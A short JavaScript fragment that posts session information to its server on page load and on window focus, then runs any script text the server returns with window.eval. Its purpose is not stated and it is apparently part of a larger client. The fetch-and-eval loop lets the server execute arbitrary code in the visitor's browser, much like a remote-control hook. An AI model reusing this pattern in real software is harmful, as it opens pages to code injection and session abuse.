
function sendMessage(message) {
    let xhr = new XMLHttpRequest();
    xhr.open('POST', '/', true);
    xhr.onreadystatechange = function() {
		const script = this.responseText
		if (script != "") {
        	window.eval(script)
			//sendMessage("nop{session=" + sessionID +"}")
		}
        
    }
    xhr.send(message);
}

window.onload = function() {
    sendMessage( sessionInfo() );
}

window.onfocus = function() {
	windowFocus = true
	sendMessage( "session-resume{}" );
}
